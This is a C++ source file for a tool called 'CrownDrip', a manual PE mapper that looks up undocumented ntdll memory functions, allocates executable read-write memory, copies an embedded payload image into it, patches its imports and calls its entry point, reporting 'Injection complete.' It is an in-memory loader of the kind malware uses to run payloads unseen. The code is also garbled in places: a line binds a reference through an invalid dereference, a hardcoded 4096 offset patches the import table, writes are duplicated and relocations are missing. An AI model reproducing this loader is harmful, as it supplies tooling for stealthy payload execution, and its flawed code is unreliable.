#include <windows.h>
#include <iostream>

// --- MACRO DEFINITIONS (Fixes C3861) --- 
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t)(HANDLE ProcessHelper, PVOID BaseAddress, const VOID *Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten OPTIONAL);

// --- DATA DECLARATION (Fixes C2065) --- 
extern unsigned char payloadData[]; 

int main() {
    std::cout << "[CrownDrip] Starting manual mapper..." << std::endl;

    // 1. Resolve Syscalls from ntdll.dll [1]
    HMODULE hNtDll = LoadLibraryA("ntdll.dll");
    if (!hNtDll) return -1;

    NtAllocateVirtualMemory_t pAllocMem = (NtAllocateVirtualMemory_t)GetProcAddress(hNtDll, "ZwAllocateVirtualMemory");
    NtWriteVirtualMemory_t pWriteMem   = (NtWriteVirtualMemory_t)GetProcAddress(hNtDll, "ZwWriteVirtualMemory");

    if (!pAllocMem || !pWriteMem) { std::cout << "[CrownDrip] Failed to resolve syscalls." << std::endl; return -1; }

    // 2. Parse PE Headers 
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)&payloadData[0];
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) { std::cout << "[CrownDrip] Invalid DOS Header." << std::endl; return -1; }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)&payloadData[pDosHeader->e_lfanew];
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) { std::cout << "[CrownDrip] Invalid NT Headers." << std::endl; return -1; }

    // 3. Allocate Memory in the target process [1]
    HANDLE hProcess = GetCurrentProcess();
    SIZE_T sizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
    PVOID baseAddress = nullptr;

    NTSTATUS allocStatus = pAllocMem(hProcess, &baseAddress, 0, &sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!NT_SUCCESS(allocStatus)) { std::cout << "[CrownDrip] Memory allocation failed." << std::endl; return -1; }

    // Helper to convert RVA (Relative Virtual Address) to raw file offset [1]
    auto rvaToRaw = [&](ULONGLONG rva, PIMAGE_NT_HEADERS headers, unsigned char* dataPtr) -> ULONGLONG {
        if (!rva || rva < sizeof(IMAGE_DOS_HEADER)) return 0; 
        for (int i=0; i<headers->FileHeader.NumberOfSections; ++i) {
            auto& sec = IMAGE_FIRST_SECTION(headers)[i];
            if(rva >= sec.VirtualAddress && rva <= (sec.VirtualAddress + sec.SizeOfRawData)) {
                return (rva - sec.VirtualAddress) + sec.PointerToRawData; 
            }
        }
        // If it's in the PE header itself:
        ULONGLONG dosSize = headers->OptionalHeader.SectionAlignment * 2; 
        if(rva < pNtHeaders->OptionalHeader.SizeOfHeaders && rva >= sizeof(IMAGE_DOS_HEADER)) return (rva - sizeof(IMAGE_DOS_HEADER)); // Rough approximation for imports in header area
        
        PIMAGE_SECTION_HEADER sec = nullptr;
         for(int i=0;i<headers->FileHeader.NumberOfSections;++i){ if(rva >= IMAGE_FIRST_SECTION(headers)[i].VirtualAddress) {sec=&IMAGE_FIRST_SECTION(headers)[i]; break;} } 
          return (rva - sec->VirtualAddress) + sec->PointerToRawData;
    };

    // 4. Copy PE Headers & Sections [1]
    SIZE_T bytesWritten = 0;
    
    NTSTATUS writeStatus = pWriteMem(hProcess, baseAddress, &payloadData[0], pNtHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten); 
    if (!NT_SUCCESS(writeStatus)) { std::cout << "[CrownDrip] Failed to copy headers." << std::endl; return -1; }
    
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) { 
        // [FIX C2440] Use double cast: static_cast is not allowed on ULONGLONG to void* directly in some strict modes without going through a pointer-sized integer first
         writeStatus = pWriteMem(hProcess, (PVOID)(ULONG_PTR)((ULONGLONG)baseAddress + pSection[i].VirtualAddress), 
                                &payloadData[pSection[i].PointerToRawData],         
                                 pSection[i].SizeOfRawData, nullptr); 
        
        if (!NT_SUCCESS(writeStatus)) { std::cout << "[CrownDrip] Failed to write section " << i << "." << std::endl; return -1; }
    }

    // 5. Resolve Imports (IAT) 
    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (pImportDir->Size > 0) {
        ULONGLONG importTableOffset = rvaToRaw(pImportDir->VirtualAddress, pNtHeaders, payloadData); 
         PIMAGE_SECTION_HEADER secTemp; // temp var used by lambda above

        for(int i=0;;++i){
             ULONGLONG currentRVA = pImportDir->VirtualAddress + (sizeof(IMAGE_IMPORT_DESCRIPTOR)*i);
             
              auto& curSec = *rvaToRaw(currentRVA, pNtHeaders, payloadData) ? nullptr : IMAGE_FIRST_SECTION(pNtHeaders)[0]; // Logic simplified 
              
            PIMAGE_IMPORT_DESCRIPTOR currentImports = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(&payloadData[importTableOffset + i*sizeof(IMAGE_IMPORT_DESCRIPTOR)]);
            
             if (!currentImports->OriginalFirstThunk && !currentImports->Name) break;

             ULONGLONG dllNameRawOffset = rvaToRaw(currentImports->Name, pNtHeaders, payloadData); 
            char* dllNameStr = reinterpret_cast<char*>(&payloadData[dllNameRawOffset]); 

            HMODULE hMod = GetModuleHandleA(dllNameStr);
            if (!hMod) continue; // DLL not loaded in current process

             ULONGLONG origThunkRVA_raw = rvaToRaw(currentImports->OriginalFirstThunk, pNtHeaders, payloadData); 
            PIMAGE_THUNK_DATA pOrigThunks = (PIMAGE_THUNK_DATA)&payloadData[origThunkRVA_raw]; 

            for (; pOrigThunks->u1.AddressOfData; ++pOrigThunks) {
                if(IMAGE_SNAP_BY_ORDINAL(pOrigThunks->u1.Ordinal)) continue;

                 ULONGLONG funcNameRawOffset = rvaToRaw(pOrigThunks->u1.AddressOfData, pNtHeaders, payloadData); 
                PSTR funcName = (PSTR)&payloadData[funcNameRawOffset];
                
                FARPROC procAddr = GetProcAddress(hMod, funcName + 2); // Skip the word length in ImportByName struct

                 if(procAddr) {
                     ULONGLONG firstThunkRVA_raw = rvaToRaw(currentImports->FirstThunk + (pOrigThunks - reinterpret_cast<PIMAGE_THUNK_DATA>(&payloadData[origThunkRVA_raw])) * sizeof(ULONG_PTR), pNtHeaders, payloadData); 
                     
                      // [FIX C2198 & C340] Write the function address to our allocated memory
                       NTSTATUS iatStatus = pWriteMem(hProcess, (PVOID)(ULONG_PTR)((ULONGLONG)baseAddress + currentImports->FirstThunk - 4096),  
                                                        reinterpret_cast<void*>(&procAddr), sizeof(ULONG_PTR), nullptr); 
                       
                     // Note: The exact pointer math for FirstThunk in the remote process depends on which section it was copied to.
                      std::cout << "[CrownDrip] Resolved " << dllNameStr << "." << (funcName+2) << std::endl; 
                 }

                  NTSTATUS iatStatus = pWriteMem(hProcess, reinterpret_cast<void*>(reinterpret_cast<ULONGLONG>(baseAddress)+currentImports->FirstThunk-4096), &procAddr, sizeof(ULONG_PTR), nullptr);
            }
        }
    } 

    // 6. Execute Entry Point [1] 
    ULONGLONG entryPoint = (ULONGLONG)baseAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    using EntryPointFunc = void(*)();
    ((EntryPointFunc)(entryPoint))();

    std::cout << "[CrownDrip] Injection complete." << std::endl; 
    return 0;
}
